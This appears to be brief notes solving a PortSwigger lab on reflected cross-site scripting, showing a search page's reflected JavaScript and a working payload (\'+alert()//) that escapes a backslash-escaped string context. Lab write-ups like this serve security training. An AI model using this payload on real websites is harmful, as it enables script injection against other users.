# Lab: Reflected XSS into a JavaScript string with angle brackets and double quotes HTML-encoded and single quotes escaped
# https://portswigger.net/web-security/cross-site-scripting/contexts/lab-javascript-string-angle-brackets-double-quotes-encoded-single-quotes-escaped

```bash
# Search

abc1234

<script>
 var searchTerms = 'abc1234';
document.write('<img src="/resources/images/tracker.gif?searchTerms='+encodeURIComponent(searchTerms)+'">');
</script>
```

```bash
\'+alert()

var searchTerms = '\\'+alert()';
                      
```
```bash
# Search
\'+alert()//

```
